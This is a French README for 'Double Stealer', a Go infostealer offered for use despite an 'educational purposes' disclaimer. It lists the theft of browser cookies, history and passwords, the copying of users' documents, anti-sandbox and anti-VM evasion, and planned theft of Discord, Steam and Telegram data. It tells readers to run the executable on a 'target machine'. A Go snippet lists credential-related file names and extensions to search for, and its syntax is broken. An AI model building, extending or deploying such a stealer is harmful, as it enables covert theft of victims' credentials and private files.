# Double Stealer

Double Stealer est un projet de collecte de données sur pc selon différents systèmes d'exploitation. Il est conçu pour extraire et copier des fichiers sensibles selon des extensions, des noms et des répertoires prédéfinis.

❗❗❗Avertissement❗❗❗ : ce programme est proposé uniquement à des fins éducatives et de recherche. Le créateur de ce programme ne tolère ni ne soutient aucune activité illégale ou malveillante et ne sera pas tenu responsable des actions de ce type entreprises par d'autres personnes susceptibles d'utiliser ce programme. En téléchargeant ou en utilisant ce programme, vous reconnaissez que vous êtes seul responsable de toutes les conséquences pouvant résulter de l'utilisation de ce programme.

## Fonctionnalités

- **Classification de la donnée** : Identifie les données et les classes selon leur origine.
- **Récupération des données Web** : Extrait les fichiers d'historique, cookies, mots de passes des navigateurs les plus populaires.
- **Copie de Fichiers** : Copie les fichiers trouvés dans les répertoires spécifiés, tels que Desktop, Documents, et Téléchargements.
- **vérification anti_sandbox antiVm** : Vérifie si le projet est dans un environnement sécurisé.

## Installation (pour modifier le projet selon vos souhaits)

1. **Clonez le Dépôt**

   \`\`\`
   git clone https://github.com/username/repository-name.git
   
   cd Double_Stealer
   \`\`\`

3. **Installez les Dépendances**

   Assurez-vous d'avoir Go installé sur votre machine. Vous pouvez obtenir Go depuis [golang.org](https://golang.org/).

4. **Configurer les Listes d'Extensions et de Noms**

   Les listes d'extensions et de noms pour la recherche de fichiers se trouvent dans le fichier \`main.go\`. Vous pouvez adapter ces listes selon vos besoins :

   \`\`\`go
    var extensions := []string{
		".txt", ".pdf", ".odc", ".doc", ".docx", ".xls", ".xlsx", ".rtf", ".md", ".log", "sqlite3", "sqlite", ".db", ".json", ".xml"}

	var names := []string{
		"Password", "password", "Passwords", "passwords", "Pass", "pass", "MotsDePasse", "motsdepasse", "MDP", "mdp",
		"Key", "key", "Keys", "keys", "Cle", "cle", "Cles", "cles", "Code", "code", "Codes", "codes",
		"Credential", "credential", "Credentials", "credentials", "Login", "login", "Logins", "logins",
		"Access", "access", "Accès", "accès", "ID", "id", "Identifiant", "identifiant", "Identifiants", "identifiants",
		"Sécurité", "sécurité", "Security", "security", "note"}
   \`\`\`

5. **A rajouter**

   System Information

   - **User**
   - **System**
   - **Disk**
   - **Network**
   - **IP Information**

   Discord Information

   - **Nitro**
   - **Badges**
   - **Billing**
   - **Email**
   - **Phone**
   - **HQ Friends**

   Application Data

   - **Steam**
   - **Riot Games**
   - **Telegram**
   - **Minecraft Session Files**


## Utilisation

1. **Exécutez le Programme**

   Utilisez l'executable corepondant à la machine cible puis récupérez les donnés dans le fichier data

   Vous pouvez également compiler le programme et exécuter l'exécutable généré (cf doc main.go).

## Compatibilité

Ce projet est conçu pour être polyvalent et peut s'adapter à différents systèmes d'exploitation, notamment Linux, macOS et Windows. Vous pouvez ajuster les chemins et configurations dans le fichier \`get-data.go\` pour correspondre à votre environnement spécifique.
